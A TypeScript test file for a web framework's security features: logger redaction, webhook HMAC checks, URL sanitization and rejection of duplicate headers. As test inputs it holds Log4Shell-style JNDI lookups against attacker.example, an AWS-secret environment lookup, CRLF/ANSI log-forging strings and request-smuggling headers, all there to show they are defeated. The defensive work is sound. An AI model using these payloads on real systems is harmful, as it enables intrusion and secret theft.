import { test } from "node:test";
import assert from "node:assert/strict";
import { z } from "zod";
import {
  App,
  createLogger,
  noopLogger,
  DEFAULT_REDACT_KEYS,
  sanitizeUrlForLog,
  SENSITIVE_URL_QUERY_KEYS,
  assertNoDuplicateSingletonHeaders,
  SMUGGLING_SINGLETON_HEADERS,
  verifyWebhookSignature,
  signWebhookPayload,
  BadRequestError,
} from "../src/index.js";

// ---------- Logger redaction ----------

test("createLogger redacts default sensitive keys", () => {
  const lines: string[] = [];
  const log = createLogger({
    level: "info",
    write: (l) => lines.push(l),
  });
  log.info(
    {
      authorization: "Bearer xyz",
      cookie: "sid=abc",
      password: "hunter2",
      token: "t",
      nested: { apikey: "secret" },
      keep: "ok",
    },
    "hi",
  );
  const obj = JSON.parse(lines[0]!);
  assert.equal(obj.authorization, "[REDACTED]");
  assert.equal(obj.cookie, "[REDACTED]");
  assert.equal(obj.password, "[REDACTED]");
  assert.equal(obj.token, "[REDACTED]");
  assert.equal(obj.nested.apikey, "[REDACTED]");
  assert.equal(obj.keep, "ok");
  assert.equal(obj.msg, "hi");
});

test("createLogger redacts JWT-shaped strings anywhere", () => {
  const lines: string[] = [];
  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
  const jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc-DEF_123";
  log.info({ payload: jwt, list: [jwt, "ok"] });
  const obj = JSON.parse(lines[0]!);
  assert.equal(obj.payload, "[REDACTED]");
  assert.deepEqual(obj.list, ["[REDACTED]", "ok"]);
});

test("createLogger redaction can be disabled and extended", () => {
  const off: string[] = [];
  const offLog = createLogger({ level: "info", write: (l) => off.push(l), redact: false });
  offLog.info({ password: "leak" });
  assert.equal(JSON.parse(off[0]!).password, "leak");

  const ext: string[] = [];
  const extLog = createLogger({
    level: "info",
    write: (l) => ext.push(l),
    redact: { keys: ["session-id"], censor: "***" },
  });
  extLog.info({ "session-id": "abc", token: "t" });
  const obj = JSON.parse(ext[0]!);
  assert.equal(obj["session-id"], "***");
  assert.equal(obj.token, "***");
});

test("createLogger child inherits redaction config", () => {
  const lines: string[] = [];
  const parent = createLogger({ level: "info", write: (l) => lines.push(l) });
  parent.child({ requestId: "r1" }).info({ password: "leak" }, "x");
  const obj = JSON.parse(lines[0]!);
  assert.equal(obj.password, "[REDACTED]");
  assert.equal(obj.requestId, "r1");
});

// Log4Shell-class regression: the default logger MUST NOT perform any
// kind of lookup / interpolation / expression evaluation on logged
// values. Untrusted strings like `${jndi:ldap://attacker/x}` that an
// attacker plants in a User-Agent / header / body field and that user
// code passes into a log call must be serialized literally — not
// resolved against a JNDI provider, not handed to a format-string
// expander, not run through `util.format`. See the Snyk Log4Shell
// remediation write-up (https://snyk.io/blog/liveramp-used-snyk-to-remediate-log4shell/).
test("createLogger serializes JNDI / lookup payloads literally (Log4Shell-class)", () => {
  const lines: string[] = [];
  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
  const payloads = [
    "${jndi:ldap://attacker.example/x}",
    "${jndi:rmi://attacker.example/y}",
    "${jndi:dns://attacker.example/z}",
    "${${lower:j}ndi:ldap://attacker.example/q}",
    "${env:AWS_SECRET_ACCESS_KEY}",
    "${sys:user.home}",
    "%s %d %j ${0} {{7*7}} #{1+1}",
  ];
  for (const p of payloads) {
    log.info({ userAgent: p, nested: { header: p }, list: [p] }, p);
  }
  assert.equal(lines.length, payloads.length);
  for (let i = 0; i < payloads.length; i++) {
    const raw = lines[i]!;
    const obj = JSON.parse(raw);
    // Every position must contain the payload verbatim.
    assert.equal(obj.msg, payloads[i]);
    assert.equal(obj.userAgent, payloads[i]);
    assert.equal(obj.nested.header, payloads[i]);
    assert.deepEqual(obj.list, [payloads[i]]);
    // And the on-wire form must not have been mutated (no lookup
    // resolved to a real value, no format token replaced).
    assert.ok(raw.includes(JSON.stringify(payloads[i])));
  }
});

test("createLogger does not expand lookup-shaped object keys", () => {
  const lines: string[] = [];
  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
  const key = "${jndi:ldap://attacker.example/k}";
  log.info({ [key]: "v" });
  const obj = JSON.parse(lines[0]!);
  assert.equal(obj[key], "v");
});

test("DEFAULT_REDACT_KEYS includes the documented set", () => {
  for (const k of ["authorization", "cookie", "set-cookie", "password", "token"]) {
    assert.ok(DEFAULT_REDACT_KEYS.includes(k));
  }
});

// Log-injection regression: an attacker who controls a string that ends
// up inside a log record (User-Agent, header, body field, error message)
// must NOT be able to forge a fake log line or smuggle ANSI escape /
// NUL control bytes into the underlying log sink. The default logger
// pipes every record through `JSON.stringify`, and the JSON spec (ECMA
// 404 / RFC 8259) requires every control code unit U+0000..U+001F to
// be escaped as `\uXXXX` (or one of `\b\f\n\r\t`). That means a
// payload like `"x\r\nINFO: User deleted"` shows up on the wire as the
// 26-byte literal sequence `x\r\nINFO: User deleted` (with a backslash-n,
// not a real newline), and an ANSI escape (0x1b) or NUL (0x00) is
// escaped to `\u001b` / `\u0000` — no terminal-control sequence reaches
// a log viewer, and the record stays one JSON object per physical line.
// See the Snyk "prevent log injection" write-up
// (https://snyk.io/blog/prevent-log-injection-vulnerability-javascript-node-js/).
test("createLogger neutralizes CRLF / NUL / ANSI escape log-injection payloads", () => {
  const lines: string[] = [];
  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
  const payloads = [
    "charlie\nINFO: User deleted",
    "charlie\r\nFATAL: db wiped",
    "charlie\rERROR: secret leaked",
    "charlie\u0000INFO: NUL smuggled",
    "\u001b[31mfake-red-error\u001b[0m",
    "\u001b]8;;https://attacker.example\u0007clickme\u001b]8;;\u0007",
  ];
  for (const p of payloads) {
    log.info({ user: p, nested: { name: p } }, p);
  }
  assert.equal(lines.length, payloads.length);
  for (let i = 0; i < payloads.length; i++) {
    const raw = lines[i]!;
    // 1. Exactly one physical line per record — no embedded raw CR/LF
    //    that a tail/journald viewer would treat as a new event.
    assert.ok(!raw.includes("\n"), `line ${i} must not contain a raw LF`);
    assert.ok(!raw.includes("\r"), `line ${i} must not contain a raw CR`);
    // 2. No raw NUL byte (some log aggregators truncate at NUL).
    assert.ok(!raw.includes("\u0000"), `line ${i} must not contain a raw NUL`);
    // 3. No raw ESC byte (0x1b) that a terminal would interpret as an
    //    ANSI control / OSC-8 hyperlink sequence.
    assert.ok(!raw.includes("\u001b"), `line ${i} must not contain a raw ESC`);
    // 4. Round-trips through JSON.parse and preserves the original
    //    bytes in every position the attacker can reach.
    const obj = JSON.parse(raw);
    assert.equal(obj.msg, payloads[i]);
    assert.equal(obj.user, payloads[i]);
    assert.equal(obj.nested.name, payloads[i]);
  }
});

// ---------- Credential-shape value redaction (Composer/Packagist 2026) ----------
//
// In May 2026 Composer printed rejected GitHub Actions tokens into stderr
// because its hardcoded format validator did not allow the new `ghs_APPID_JWT`
// shape. Defense-in-depth: even when a user code path stuffs an opaque
// credential into an unrecognized log field or interpolates it into a
// string, the logger must redact it by value shape.

test("logger redacts whole-value GitHub / npm / Stripe / AWS / Slack / Google tokens", () => {
  const lines: string[] = [];
  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
  log.info({
    a: "ghs_" + "a".repeat(40),
    b: "github_pat_" + "B".repeat(50),
    c: "xoxb-" + "1".repeat(20) + "-abcdef",
    d: "AKIAABCDEFGHIJKLMNOP",
    e: "sk_live_" + "x".repeat(30),
    f: "npm_" + "y".repeat(36),
    g: "glpat-" + "z".repeat(25),
    h: "AIza" + "k".repeat(35),
    i: "sk-ant-" + "m".repeat(40),
    j: "sk-" + "n".repeat(40),
  });
  const obj = JSON.parse(lines[0]!);
  for (const k of ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j"]) {
    assert.equal(obj[k], "[REDACTED]", `field ${k} should be redacted`);
  }
});

test("logger redacts the 2026 stateless JWT-format GitHub installation token (ghs_ with dots)", () => {
  // https://github.blog/changelog/2026-05-15-github-app-installation-tokens-per-request-override-header/
  // The new server-to-server / Actions GITHUB_TOKEN format is a ~520-char
  // `ghs_`-prefixed JWT with two dots. A regex limited to [A-Za-z0-9] would
  // truncate at the first dot and leak the payload + signature segments.
  const lines: string[] = [];
  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
  const statelessToken =
    "ghs_" +
    "A".repeat(80) +
    "." +
    "B".repeat(300) +
    "." +
    "C".repeat(100) +
    "-_";
  log.info({ whole: statelessToken });
  log.error(
    { err: `auth failed with token ${statelessToken} from CI` },
    "auth-fail",
  );
  const whole = JSON.parse(lines[0]!);
  const interpolated = JSON.parse(lines[1]!);
  assert.equal(whole.whole, "[REDACTED]", "whole stateless token must be redacted");
  assert.ok(
    !interpolated.err.includes("B".repeat(300)),
    "JWT payload segment must not survive after the first dot",
  );
  assert.ok(
    !interpolated.err.includes(statelessToken),
    "raw stateless token must not appear in log output",
  );
  assert.match(interpolated.err, /\[REDACTED\]/);
});

test("logger redacts credential substrings interpolated into error-style strings", () => {
  // This is the exact Composer/Packagist 2026 leak pattern: the framework
  // (or user code) embeds the rejected token value into a message.
  const lines: string[] = [];
  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
  const token = "ghs_" + "a".repeat(40);
  log.error({ err: `Unable to authenticate, got token: ${token} from CI` }, "auth-fail");
  const obj = JSON.parse(lines[0]!);
  assert.ok(!obj.err.includes(token), "raw token must not appear in log output");
  assert.match(obj.err, /\[REDACTED\]/);
  assert.match(obj.err, /Unable to authenticate/); // surrounding context preserved
});

test("logger leaves ordinary identifiers alone (no false positives)", () => {
  const lines: string[] = [];
  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
  log.info({
    short: "sk-abc",            // below the 20-char minimum
    name: "ghp_short",          // below the 36-char minimum
    uuid: "550e8400-e29b-41d4-a716-446655440000",
    text: "hello world",
    awsLooking: "AKIASHORT",    // below the 16-char tail
  });
  const obj = JSON.parse(lines[0]!);
  assert.equal(obj.short, "sk-abc");
  assert.equal(obj.name, "ghp_short");
  assert.equal(obj.uuid, "550e8400-e29b-41d4-a716-446655440000");
  assert.equal(obj.text, "hello world");
  assert.equal(obj.awsLooking, "AKIASHORT");
});

test("redactCredentialLikeStrings:false disables value-shape redaction", () => {
  const lines: string[] = [];
  const log = createLogger({
    level: "info",
    write: (l) => lines.push(l),
    redact: { redactCredentialLikeStrings: false },
  });
  const token = "ghs_" + "a".repeat(40);
  log.info({ misc: token });
  const obj = JSON.parse(lines[0]!);
  assert.equal(obj.misc, token);
});

test("DEFAULT_REDACT_KEYS includes AI provider credential headers (LiteLLM blast-radius pattern)", () => {
  // Headers commonly carrying LLM provider keys when an app brokers
  // prompts to OpenAI / Anthropic / Google / Azure / Cohere / Mistral /
  // Groq / Replicate / HuggingFace, or runs an AI gateway like LiteLLM.
  // A single log of a request with one of these set must not leak the
  // credential into log aggregators. See SECURITY.md § "AI gateway
  // blast radius (LiteLLM 2026 pattern)".
  for (const k of [
    "openai-api-key",
    "x-openai-api-key",
    "anthropic-api-key",
    "x-anthropic-api-key",
    "x-goog-api-key",
    "azure-api-key",
    "cohere-api-key",
    "mistral-api-key",
    "groq-api-key",
    "replicate-api-token",
    "huggingface-api-key",
    "x-litellm-master-key",
    "litellm-master-key",
    "litellm-api-key",
  ]) {
    assert.ok(DEFAULT_REDACT_KEYS.includes(k), `${k} should be in DEFAULT_REDACT_KEYS`);
  }
});

test("logger redacts AI provider keys case-insensitively", () => {
  const lines: string[] = [];
  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
  log.info(
    {
      "X-OpenAI-Api-Key": "sk-leak-openai",
      "anthropic-api-key": "sk-ant-leak",
      "X-Goog-Api-Key": "AIzaLeakGoogle",
      "x-litellm-master-key": "sk-litellm-leak",
    },
    "ai-call",
  );
  const obj = JSON.parse(lines[0]!);
  assert.equal(obj["X-OpenAI-Api-Key"], "[REDACTED]");
  assert.equal(obj["anthropic-api-key"], "[REDACTED]");
  assert.equal(obj["X-Goog-Api-Key"], "[REDACTED]");
  assert.equal(obj["x-litellm-master-key"], "[REDACTED]");
});

test("redaction does not crash on cycles or arrays", () => {
  const lines: string[] = [];
  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
  const a: any = { token: "t" };
  a.self = a;
  log.info(a, "cycle");
  const parsed = lines[0]!;
  // Parsing may fail due to cycle in JSON.stringify — but redaction itself must
  // have run, so the fallback line should be emitted.
  assert.match(parsed, /<unserializable log>|REDACTED/);
});

// ---------- Strip Server / X-Powered-By ----------

test("Server and X-Powered-By are stripped from every response", async () => {
  const app = new App({ logger: false });
  app.route({
    method: "GET",
    path: "/leak",
    operationId: "leak",
    responses: { 200: { description: "ok", body: z.object({ ok: z.boolean() }) as any } },
    handler: async ({ set }) => {
      set.headers.set("server", "DaloyJS/1.0");
      set.headers.set("x-powered-by", "DaloyJS");
      return { status: 200 as const, body: { ok: true } };
    },
  });
  const res = await app.request("/leak");
  assert.equal(res.status, 200);
  assert.equal(res.headers.get("server"), null);
  assert.equal(res.headers.get("x-powered-by"), null);
});

test("stripServerHeaders: false preserves the headers", async () => {
  const app = new App({ logger: false, stripServerHeaders: false });
  app.route({
    method: "GET",
    path: "/keep",
    operationId: "keep",
    responses: { 200: { description: "ok", body: z.object({ ok: z.boolean() }) as any } },
    handler: async ({ set }) => {
      set.headers.set("server", "DaloyJS/1.0");
      return { status: 200 as const, body: { ok: true } };
    },
  });
  const res = await app.request("/keep");
  assert.equal(res.headers.get("server"), "DaloyJS/1.0");
});

// ---------- Duplicate singleton headers ----------

test("assertNoDuplicateSingletonHeaders accepts a single Host", () => {
  const h = new Headers({ host: "example.com", "content-length": "0" });
  assert.doesNotThrow(() => assertNoDuplicateSingletonHeaders(h));
});

test("assertNoDuplicateSingletonHeaders rejects duplicate Host", () => {
  const h = new Headers();
  h.append("host", "a.example");
  h.append("host", "b.example");
  assert.throws(() => assertNoDuplicateSingletonHeaders(h), BadRequestError);
});

test("assertNoDuplicateSingletonHeaders rejects duplicate Content-Length", () => {
  const h = new Headers();
  h.append("content-length", "10");
  h.append("content-length", "20");
  assert.throws(() => assertNoDuplicateSingletonHeaders(h), BadRequestError);
});

test("assertNoDuplicateSingletonHeaders rejects duplicate Transfer-Encoding", () => {
  const h = new Headers();
  h.append("transfer-encoding", "chunked");
  h.append("transfer-encoding", "gzip");
  assert.throws(() => assertNoDuplicateSingletonHeaders(h), BadRequestError);
});

test("App rejects requests carrying duplicate Host header with 400", async () => {
  const app = new App({ logger: false });
  app.route({
    method: "GET",
    path: "/ok",
    operationId: "ok",
    responses: { 200: { description: "ok", body: z.object({ ok: z.boolean() }) as any } },
    handler: async () => ({ status: 200 as const, body: { ok: true } }),
  });
  const headers = new Headers();
  headers.append("host", "a.example");
  headers.append("host", "b.example");
  const res = await app.fetch(new Request("http://localhost/ok", { headers }));
  assert.equal(res.status, 400);
});

test("duplicate Host is rejected before user onRequest hooks run", async () => {
  let called = false;
  const app = new App({
    logger: false,
    hooks: {
      onRequest: () => {
        called = true;
      },
    },
  });
  app.route({
    method: "GET",
    path: "/ok",
    operationId: "ok",
    responses: { 200: { description: "ok", body: z.object({ ok: z.boolean() }) as any } },
    handler: async () => ({ status: 200 as const, body: { ok: true } }),
  });
  const headers = new Headers();
  headers.append("host", "a.example");
  headers.append("host", "b.example");
  const res = await app.fetch(new Request("http://localhost/ok", { headers }));
  assert.equal(res.status, 400);
  assert.equal(called, false);
});

test("duplicate Transfer-Encoding is rejected before user onRequest hooks run", async () => {
  let called = false;
  const app = new App({
    logger: false,
    hooks: {
      onRequest: () => {
        called = true;
      },
    },
  });
  app.route({
    method: "POST",
    path: "/ok",
    operationId: "okPost",
    responses: { 200: { description: "ok", body: z.object({ ok: z.boolean() }) as any } },
    handler: async () => ({ status: 200 as const, body: { ok: true } }),
  });
  const headers = new Headers({ "content-type": "application/json" });
  headers.append("transfer-encoding", "chunked");
  headers.append("transfer-encoding", "gzip");
  const res = await app.fetch(
    new Request("http://localhost/ok", {
      method: "POST",
      headers,
      body: "{}",
    }),
  );
  assert.equal(res.status, 400);
  assert.equal(called, false);
});

test("SMUGGLING_SINGLETON_HEADERS exposes HTTP request smuggling singleton headers", () => {
  assert.ok(SMUGGLING_SINGLETON_HEADERS.includes("host"));
  assert.ok(SMUGGLING_SINGLETON_HEADERS.includes("content-length"));
  assert.ok(SMUGGLING_SINGLETON_HEADERS.includes("transfer-encoding"));
});

// ---------- Webhook HMAC ----------

test("signWebhookPayload + verifyWebhookSignature roundtrip (hex)", async () => {
  const secret = "shhh";
  const payload = new TextEncoder().encode('{"event":"ping"}');
  const sig = await signWebhookPayload({ payload, secret });
  assert.match(sig, /^[0-9a-f]{64}$/);
  assert.equal(
    await verifyWebhookSignature({ payload, signature: sig, secret }),
    true,
  );
});

test("verifyWebhookSignature accepts sha256= prefix", async () => {
  const secret = "k";
  const payload = "hello";
  const sig = await signWebhookPayload({ payload, secret });
  assert.equal(
    await verifyWebhookSignature({
      payload,
      signature: `sha256=${sig}`,
      secret,
    }),
    true,
  );
});

test("verifyWebhookSignature accepts base64-encoded signatures", async () => {
  const secret = "k";
  const payload = "hello";
  const hex = await signWebhookPayload({ payload, secret });
  // Convert hex -> base64
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
  const b64 = Buffer.from(bytes).toString("base64");
  assert.equal(
    await verifyWebhookSignature({ payload, signature: b64, secret }),
    true,
  );
});

test("verifyWebhookSignature accepts padded base64 without treating padding as a prefix", async () => {
  const payload = "payload-3";
  const secret = "k";
  const signature = "qu48YYDwTExIPPVUjRLGjNZPIz8BDPL6NtxfZ71w4es=";
  assert.equal(
    await verifyWebhookSignature({ payload, signature, secret }),
    true,
  );
});

test("verifyWebhookSignature rejects mismatched or deprecated algorithm prefixes", async () => {
  const payload = "hello";
  const secret = "k";
  const sha256 = await signWebhookPayload({ payload, secret });
  assert.equal(
    await verifyWebhookSignature({ payload, signature: `sha512=${sha256}`, secret }),
    false,
  );
  assert.equal(
    await verifyWebhookSignature({ payload, signature: `sha1=${sha256}`, secret }),
    false,
  );
});

test("verifyWebhookSignature returns false on tampered payload", async () => {
  const secret = "k";
  const sig = await signWebhookPayload({ payload: "hello", secret });
  assert.equal(
    await verifyWebhookSignature({ payload: "hello!", signature: sig, secret }),
    false,
  );
});

test("verifyWebhookSignature returns false on malformed signature", async () => {
  assert.equal(
    await verifyWebhookSignature({
      payload: "x",
      signature: "not-hex-or-b64!!!",
      secret: "k",
    }),
    false,
  );
});

test("verifyWebhookSignature works with sha512 and Uint8Array signature", async () => {
  const secret = new TextEncoder().encode("k");
  const payload = "hello";
  const hex = await signWebhookPayload({ payload, secret, algorithm: "sha512" });
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
  assert.equal(
    await verifyWebhookSignature({
      payload,
      signature: bytes,
      secret,
      algorithm: "sha512",
    }),
    true,
  );
});

test("signWebhookPayload supports sha384", async () => {
  const sig = await signWebhookPayload({ payload: "x", secret: "k", algorithm: "sha384" });
  assert.match(sig, /^[0-9a-f]{96}$/);
});

test("signWebhookPayload rejects unsupported runtime algorithms", async () => {
  await assert.rejects(
    () => signWebhookPayload({ payload: "x", secret: "k", algorithm: "sha1" as any }),
    TypeError,
  );
});

test("verifyWebhookSignature rejects Uint8Array signatures of wrong length", async () => {
  assert.equal(
    await verifyWebhookSignature({
      payload: "x",
      signature: new Uint8Array(8),
      secret: "k",
    }),
    false,
  );
});

test("verifyWebhookSignature rejects empty signature strings", async () => {
  assert.equal(
    await verifyWebhookSignature({ payload: "x", signature: "", secret: "k" }),
    false,
  );
  assert.equal(
    await verifyWebhookSignature({
      payload: "x",
      signature: "sha256=",
      secret: "k",
    }),
    false,
  );
});

test("verifyWebhookSignature rejects base64 strings with invalid padding length", async () => {
  assert.equal(
    await verifyWebhookSignature({ payload: "x", signature: "AAAAA", secret: "k" }),
    false,
  );
});

test("verifyWebhookSignature returns false on bogus runtime algorithm value", async () => {
  assert.equal(
    await verifyWebhookSignature({
      payload: "x",
      signature: "00",
      secret: "k",
      algorithm: "md5" as any,
    }),
    false,
  );
});

// ---------- Webhook HMAC: timestamp / replay protection ----------

test("sign + verify roundtrip binds the signature to the timestamp", async () => {
  const secret = "shhh";
  const payload = '{"event":"ping"}';
  const ts = 1_715_000_000;
  const sig = await signWebhookPayload({ payload, secret, timestamp: ts });
  // Verifier within the default tolerance window accepts.
  assert.equal(
    await verifyWebhookSignature({
      payload,
      signature: sig,
      secret,
      timestamp: ts,
      now: () => ts * 1000,
    }),
    true,
  );
  // Same signature, but caller swapped the timestamp → reject (different
  // signed payload string, even if math happens to line up they aren't equal).
  assert.equal(
    await verifyWebhookSignature({
      payload,
      signature: sig,
      secret,
      timestamp: ts + 1,
      now: () => (ts + 1) * 1000,
    }),
    false,
  );
});

test("verifyWebhookSignature rejects timestamps outside the tolerance window (replay)", async () => {
  const secret = "k";
  const payload = "evt";
  const ts = 1_700_000_000;
  const sig = await signWebhookPayload({ payload, secret, timestamp: ts });
  // 10 minutes later, with the default 5-minute tolerance → replay rejected.
  assert.equal(
    await verifyWebhookSignature({
      payload,
      signature: sig,
      secret,
      timestamp: ts,
      now: () => (ts + 600) * 1000,
    }),
    false,
  );
  // Same drift, but the receiver bumped tolerance to 15 minutes → accepted.
  assert.equal(
    await verifyWebhookSignature({
      payload,
      signature: sig,
      secret,
      timestamp: ts,
      toleranceSeconds: 900,
      now: () => (ts + 600) * 1000,
    }),
    true,
  );
});

test("verifyWebhookSignature also rejects timestamps that are too far in the future", async () => {
  const secret = "k";
  const payload = "evt";
  const ts = 1_800_000_000;
  const sig = await signWebhookPayload({ payload, secret, timestamp: ts });
  assert.equal(
    await verifyWebhookSignature({
      payload,
      signature: sig,
      secret,
      timestamp: ts,
      now: () => (ts - 600) * 1000, // receiver clock 10 min behind
    }),
    false,
  );
});

test("verifyWebhookSignature without timestamp does not accept signatures bound to one", async () => {
  const secret = "k";
  const payload = "evt";
  const ts = 1_715_000_000;
  const signedWithTs = await signWebhookPayload({ payload, secret, timestamp: ts });
  // Receiver forgot to pass timestamp → would have verified raw payload, not
  // "<ts>.payload". Must reject so a bug in the receiver does not silently
  // accept stale signatures.
  assert.equal(
    await verifyWebhookSignature({
      payload,
      signature: signedWithTs,
      secret,
    }),
    false,
  );
  // Symmetric: signature WITHOUT ts must not verify if receiver supplies one.
  const signedWithoutTs = await signWebhookPayload({ payload, secret });
  assert.equal(
    await verifyWebhookSignature({
      payload,
      signature: signedWithoutTs,
      secret,
      timestamp: ts,
      now: () => ts * 1000,
    }),
    false,
  );
});

test("verifyWebhookSignature accepts string timestamps in canonical integer-seconds form", async () => {
  const secret = "k";
  const payload = "evt";
  const ts = 1_725_000_000;
  const sig = await signWebhookPayload({ payload, secret, timestamp: String(ts) });
  assert.equal(
    await verifyWebhookSignature({
      payload,
      signature: sig,
      secret,
      timestamp: String(ts),
      now: () => ts * 1000,
    }),
    true,
  );
});

test("verifyWebhookSignature rejects malformed timestamp strings", async () => {
  const secret = "k";
  const payload = "evt";
  const sig = await signWebhookPayload({ payload, secret, timestamp: 1_730_000_000 });
  for (const bad of ["  1730000000", "1730000000 ", "+1730000000", "-1", "1.5", "00123", "abc", ""]) {
    assert.equal(
      await verifyWebhookSignature({
        payload,
        signature: sig,
        secret,
        timestamp: bad,
        now: () => 1_730_000_000 * 1000,
      }),
      false,
      `timestamp ${JSON.stringify(bad)} must be rejected`,
    );
  }
});

test("verifyWebhookSignature rejects non-finite / negative tolerance", async () => {
  const secret = "k";
  const payload = "evt";
  const ts = 1_740_000_000;
  const sig = await signWebhookPayload({ payload, secret, timestamp: ts });
  for (const bad of [-1, Number.NaN, Number.POSITIVE_INFINITY]) {
    assert.equal(
      await verifyWebhookSignature({
        payload,
        signature: sig,
        secret,
        timestamp: ts,
        toleranceSeconds: bad,
        now: () => ts * 1000,
      }),
      false,
    );
  }
});

test("signWebhookPayload rejects malformed timestamp values", async () => {
  for (const bad of [-1, 1.5, Number.NaN, "abc", "1.0", " 1 "] as const) {
    await assert.rejects(
      () =>
        signWebhookPayload({
          payload: "x",
          secret: "k",
          timestamp: bad as any,
        }),
      TypeError,
    );
  }
});

// ---------- env option + NODE_ENV mismatch ----------

test("App.env: 'production' takes precedence over NODE_ENV", async () => {
  const app = new App({ logger: false, env: "production" });
  app.route({
    method: "GET",
    path: "/boom",
    operationId: "boom",
    responses: { 500: { description: "err", body: z.object({}).passthrough() as any } },
    handler: async () => {
      throw new Error("internal-leak-message");
    },
  });
  const res = await app.request("/boom");
  assert.equal(res.status, 500);
  const body = await res.json();
  // Production mode hides the underlying error message.
  assert.notEqual(body.detail, "internal-leak-message");
});

test("App warns when env disagrees with NODE_ENV", () => {
  const prev = process.env.NODE_ENV;
  process.env.NODE_ENV = "production";
  try {
    const warns: any[] = [];
    const log = {
      ...noopLogger,
      warn: (obj: any) => warns.push(obj),
    };
    new App({ logger: log, env: "development" });
    assert.equal(warns.length, 1);
    assert.equal(warns[0].event, "env.mismatch");
    assert.equal(warns[0].env, "development");
    assert.equal(warns[0].nodeEnv, "production");
  } finally {
    if (prev === undefined) delete process.env.NODE_ENV;
    else process.env.NODE_ENV = prev;
  }
});

test("App stays silent when env matches NODE_ENV", () => {
  const prev = process.env.NODE_ENV;
  process.env.NODE_ENV = "development";
  try {
    const warns: any[] = [];
    const log = { ...noopLogger, warn: (obj: any) => warns.push(obj) };
    new App({ logger: log, env: "development" });
    assert.equal(warns.length, 0);
  } finally {
    if (prev === undefined) delete process.env.NODE_ENV;
    else process.env.NODE_ENV = prev;
  }
});

test("App stays silent when env is omitted (no mismatch possible)", () => {
  const prev = process.env.NODE_ENV;
  process.env.NODE_ENV = "production";
  try {
    const warns: any[] = [];
    const log = { ...noopLogger, warn: (obj: any) => warns.push(obj) };
    new App({ logger: log });
    assert.equal(warns.length, 0);
  } finally {
    if (prev === undefined) delete process.env.NODE_ENV;
    else process.env.NODE_ENV = prev;
  }
});

// ---------- request URL sanitization for logs (DeepSec audit) ----------

test("sanitizeUrlForLog redacts OAuth/code/token query values", () => {
  const raw =
    "https://app.example.com/callback?code=oauth-secret-code&state=xyz&q=books";
  const safe = sanitizeUrlForLog(raw);
  assert.match(safe, /\/callback/);
  assert.match(safe, /q=books/);
  assert.match(safe, /code=%5BREDACTED%5D|code=\[REDACTED\]/);
  assert.doesNotMatch(safe, /oauth-secret-code/);
  assert.ok(SENSITIVE_URL_QUERY_KEYS.includes("code"));
});

test("sanitizeUrlForLog strips query on malformed relative-ish input without crashing", () => {
  assert.equal(sanitizeUrlForLog("/path?token=abc"), "/path");
});

test("App child logger binds a redacted url (not the raw request URL)", async () => {
  const lines: string[] = [];
  const log = createLogger({ level: "warn", write: (l) => lines.push(l) });
  const app = new App({ env: "development", logger: log });
  app.route({
    method: "GET",
    path: "/boom",
    responses: { 200: { description: "ok" } },
    handler: async () => {
      throw new Error("boom");
    },
  });
  await app.fetch(new Request("http://x/boom?access_token=super-secret-token&q=1"));
  assert.ok(lines.length >= 1, "expected an error log line");
  const joined = lines.join("\n");
  assert.doesNotMatch(joined, /super-secret-token/);
  assert.match(joined, /\/boom/);
});

test("sanitizeUrlForLog redacts AWS SigV4 presigned URL signature + credential", () => {
  const raw =
    "https://bucket.s3.amazonaws.com/report.csv" +
    "?X-Amz-Algorithm=AWS4-HMAC-SHA256" +
    "&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20260719%2Fus-east-1%2Fs3%2Faws4_request" +
    "&X-Amz-Date=20260719T000000Z" +
    "&X-Amz-Expires=900" +
    "&X-Amz-SignedHeaders=host" +
    "&X-Amz-Signature=deadbeefcafebabe1234567890abcdef1234567890abcdef1234567890abcdef";
  const safe = sanitizeUrlForLog(raw);
  // The signature and the credential (embeds the access-key id) must be gone.
  assert.doesNotMatch(safe, /deadbeefcafebabe/);
  assert.doesNotMatch(safe, /AKIAIOSFODNN7EXAMPLE/);
  // Path is retained for operability.
  assert.match(safe, /\/report\.csv/);
});

test("sanitizeUrlForLog redacts GCS V4 signed URL signature + credential", () => {
  const raw =
    "https://storage.googleapis.com/bucket/object.txt" +
    "?X-Goog-Algorithm=GOOG4-RSA-SHA256" +
    "&X-Goog-Credential=svc%40proj.iam.gserviceaccount.com%2F20260719%2Fauto%2Fstorage%2Fgoog4_request" +
    "&X-Goog-Date=20260719T000000Z" +
    "&X-Goog-Expires=900" +
    "&X-Goog-SignedHeaders=host" +
    "&X-Goog-Signature=0123456789abcdeffedcba98765432100123456789abcdeffedcba9876543210";
  const safe = sanitizeUrlForLog(raw);
  assert.doesNotMatch(safe, /0123456789abcdef/);
  assert.doesNotMatch(safe, /svc%40proj|svc@proj/);
  assert.match(safe, /\/bucket\/object\.txt/);
});

// Regression: the DeepSec wave over-broadened DEFAULT_REDACT_KEYS with generic
// query names (`id`, `key`, `state`, …). Those are common, non-secret
// STRUCTURED field names; redacting them at every depth corrupts normal logs.
// URL-query redaction is handled separately by sanitizeUrlForLog.
test("DEFAULT_REDACT_KEYS does not redact common non-secret structured fields", () => {
  for (const k of ["id", "key", "state", "code", "session", "sid", "sig", "signature", "auth"]) {
    assert.ok(
      !DEFAULT_REDACT_KEYS.includes(k),
      `${k} should NOT be a global structured redact key (over-redaction risk)`,
    );
  }
});

test("createLogger keeps a benign id/state/key field visible in the record", () => {
  const lines: string[] = [];
  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
  log.info({ id: "order-42", state: "shipped", key: "sort-key-7", msg: "ok" });
  const obj = JSON.parse(lines[0]!) as Record<string, unknown>;
  assert.equal(obj.id, "order-42");
  assert.equal(obj.state, "shipped");
  assert.equal(obj.key, "sort-key-7");
});

